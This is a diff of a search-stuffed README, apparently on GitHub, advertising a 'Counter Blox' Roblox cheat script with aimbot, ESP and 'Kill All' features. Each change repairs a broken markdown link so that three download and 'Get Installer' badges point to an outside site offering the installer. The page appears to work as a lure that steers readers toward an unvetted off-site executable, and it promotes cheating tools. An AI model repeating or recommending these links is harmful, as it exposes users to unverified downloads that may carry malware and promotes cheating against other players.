@@ -6,9 +6,9 @@
 
 Welcome to the definitive repository for the ultimate tactical enhancement utility tailored for desktop environments. If you have been searching for a reliable **roblox counter blox script**, your search ends here. This open-source project is widely recognized across platforms like GitHub, where enthusiasts often look for an efficient **counter blox script github** solution designed to elevate tactical gameplay to the absolute maximum.
 
-[![Download Now](https://img.shields.io/badge/Download-Counter_Blox_Script-brightgreen?style=for-the-badge&logo=github)]((https://countblox.github.io/counter-blox/)
+[![Download Now](https://img.shields.io/badge/Download-Counter_Blox_Script-brightgreen?style=for-the-badge&logo=github)](https://countblox.github.io/counter-blox/)
 
-<img width="1280" height="720" alt="Counter Blox Script - Aimbot, ESP, Kill All" src="https://github.com/user-attachments/assets/b8284d75-1c4b-4c40-b10f-7d76569e17d7" />
+<img width="1280" height="720" alt="Counter Blox Script - Aimbot, ESP, Kill All" src="https://github.com/user-attachments/assets/f3195470-adac-4cf7-912a-f8dafc5d7b72" />
 
 ---
 
@@ -56,7 +56,7 @@ Whether you are participating in casual matches or engaging in competitive high-
 7. Select your preferred configuration profile from the drop-down menu.
 8. Press the designated hotkey in-game to activate the user interface.
 
-[![Download Package](https://img.shields.io/badge/Get_Installer-Click_Here-blue?style=for-the-badge)]((https://countblox.github.io/counter-blox/)
+[![Download Package](https://img.shields.io/badge/Get_Installer-Click_Here-blue?style=for-the-badge)](https://countblox.github.io/counter-blox/)
 
 ---
 
@@ -198,6 +198,6 @@ Configuration files are automatically generated and stored in the user profile d
 
 This toolkit provides an efficient, lightweight, and highly customizable solution for optimizing your gameplay experience. We hope this documentation helps you set up and configure your environment smoothly. 
 
-[![Download Final Release](https://img.shields.io/badge/Download_Now-Get_Started-success?style=for-the-badge&logo=github)]((https://countblox.github.io/counter-blox/)
+[![Download Final Release](https://img.shields.io/badge/Download_Now-Get_Started-success?style=for-the-badge&logo=github)](https://countblox.github.io/counter-blox/)
 
 *If you found this utility helpful, please consider giving the repository a ⭐ star on GitHub to support ongoing development!*
